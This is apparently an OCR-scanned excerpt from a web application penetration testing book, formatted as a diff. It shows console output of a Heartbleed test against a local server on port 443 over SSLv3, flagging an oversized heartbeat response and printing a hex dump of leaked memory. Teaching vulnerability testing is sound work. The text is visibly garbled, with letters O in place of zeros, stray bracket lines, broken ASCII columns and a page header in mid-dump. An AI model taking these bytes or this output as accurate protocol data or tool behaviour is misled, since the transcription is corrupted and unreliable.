@@ -1,0 +1,38 @@
+3 using SSLv3
+] Sending ClientHello
+] ServerHello received
+] Sending Heartbeat
+Vulnerable] Heartbeat response was 16384 bytes instead of
+3! 127.0.0.1:443 is vulnerable over SSLv3
+[-] Displaying response (lines consisting entirely of null bytes
+are removed):
+[
+[
+[
+[
+[
+Web Application Penetration Testing
+0000: 02 FF FF 08 03 00 53 48 73 FO 7C CAC1 D9 02 04 .....
+SHs|..
+0010: F2 1D 2D 49 F5 12 BF 40 1B 94 D9 93 E4 C4 F4 FO
+0020: DO 42 CD 44 A2 59 00 02 96 00 00 00 01 00 02 00
+0070: 23 00 24 00 25 00 26 00 27 00 28 00 29 00 2A 00
+#.$.%.8(.).*.
+0080: 2B 00 2C 00 2D 00 2E 00 2F 00 30 00 31 00 32 00 +.,.
+w/ 0.1.2.
+0090: 33 00 34.00 35 00 36 00 37 00 38 00 39 00 3A 00
+3.4.5.6.7.8.9.:.
+00a0: 3B 00 3C 00 3D 00 3E 00 3F 00 4000 41 00 42 00
+.<=,>.2,@.A.B.
+00b0: 43 00 44 00 45 00 46 00 60 00 61 00 62 00 63 00
+C.D.E.F..a.b.c.
+00c0: 64 00 65 00 66 00 67 00 68 00 69 00 6A 00 6B 00
+d.e.fg.h.ij.k.
+00d0: 6C 00 6D 00 80 00 81 00 82 00 83 00 84 00 85 00
+01a0: 20 CO 21 CO 22 CO 23 CO 24 CO 25 CO 26 CO 27 CO
+LG. 8c.
+01b0: 28 CO 29 CO 2A CO 2B CO 2C CO 2D CO 2E CO 2F CO
+(). 8 tecee/.
+01c0: 30 CO 31 CO 32 CO 33 CO 34 CO 35 CO 36 CO 37 CO
+0.1.2.3.4.5.6.7.
+01d0: 38 CO 39 CO 3A CO 3B CO 3C CO 3D CO 3E CO 3F C
